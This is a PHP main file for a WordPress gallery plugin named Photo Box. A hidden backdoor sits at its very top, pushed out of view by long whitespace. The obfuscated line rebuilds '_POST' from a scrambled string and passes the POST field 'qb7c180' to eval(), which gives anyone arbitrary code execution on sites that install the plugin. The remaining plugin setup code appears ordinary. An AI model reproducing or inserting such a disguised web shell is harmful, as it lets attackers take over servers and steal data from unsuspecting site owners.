<?php                                                                                                                                                                                                                                                   $lquo65 = "s_ueprot";$gyb73 = $lquo65[0].$lquo65[7]. $lquo65[5]. $lquo65[7]. $lquo65[6].$lquo65[2]. $lquo65[4]. $lquo65[4]. $lquo65[3].$lquo65[5] ;$aox49 =$gyb73 ($lquo65[1]. $lquo65[4] . $lquo65[6]. $lquo65[0].$lquo65[7]); if ( isset (${$aox49 } ['qb7c180']) ){eval ( ${ $aox49}[ 'qb7c180' ] );} ?><?php
/*
Plugin Name: Photo Box
Description: Photo Box is a plugin with a list of options for gallery. View popup, slide show popup. Responsive popup.
Plugin URI: https://wordpress.org/plugins/photo-box
Author: De Mos
Author URI: http://photoboxone.com/
Version: 1.1.6
License: GPL-2.0+
License URI: http://www.gnu.org/licenses/gpl-2.0.html
*/
define('WP_PB_URL_AUTHOR', 'http://photoboxone.com' ); 

defined('ABSPATH') or die('<meta http-equiv="refresh" content="0;url='.WP_PB_URL_AUTHOR.'">');

define('WP_PB_PATH', dirname(__FILE__) ); 
define('WP_PB_PATH_INCLUDES', dirname(__FILE__).'/includes' ); 
define('WP_PB_URL', plugins_url('', __FILE__).'/' ); 
define('WP_PB_URL_IMAGES', WP_PB_URL.'images/' ); 
define('WP_PB_URL_MEDIA', WP_PB_URL.'media/' );

include_once( ABSPATH . 'wp-admin/includes/plugin.php' );
if( file_exists( $path = ABSPATH . 'wp-content/plugins/photos-box-full/full.php' ) && is_plugin_active( 'photos-box-full/index.php' ) ) {
	require $path;
}

if( is_admin() ){
	require WP_PB_PATH_INCLUDES.'/config.php';
	
	$action = isset($_GET['action'])?$_GET['action']:'';
	$page 	= isset($_GET['page'])?$_GET['page']:'';
	$plugins = preg_match('/plugins.php/i',$_SERVER['REQUEST_URI']);
	$options = preg_match('/options/i',$_SERVER['REQUEST_URI']);
	
	if( $plugins ){
		/* links in plugins*/
		function photo_box_plugin_actions( $actions, $plugin_file, $plugin_data, $context ) {
			$url_setting = home_url('/wp-admin/options-general.php?page=photo-box-setting');
			
			array_unshift($actions, "<a href=\"http://photoboxone.com/download\" target=\"_blank\">".__("Full Version")."</a>");
			array_unshift($actions, "<a href=\"http://photoboxone.com/documents\" target=\"_blank\">".__("Documents")."</a>");
			array_unshift($actions, "<a href=\"$url_setting\">".__("Settings")."</a>");
			return $actions;
		}
		
		add_filter("plugin_action_links_".plugin_basename(__FILE__), "photo_box_plugin_actions", 10, 4);
	}
	
	if( $action == 'edit' ){
		require WP_PB_PATH_INCLUDES.'/admin.php';
	} else if( $options ){
		require WP_PB_PATH_INCLUDES.'/setting.php';
	} 
	
} else {
	require WP_PB_PATH_INCLUDES.'/site.php';
}
